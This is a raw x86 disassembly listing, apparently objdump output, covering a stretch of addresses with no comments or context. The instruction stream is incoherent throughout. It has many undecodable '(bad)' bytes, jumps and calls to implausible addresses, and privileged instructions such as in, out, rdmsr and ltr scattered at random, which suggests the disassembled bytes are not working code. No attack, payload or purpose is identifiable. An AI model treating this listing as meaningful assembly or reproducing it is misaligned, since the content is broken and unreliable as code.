  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
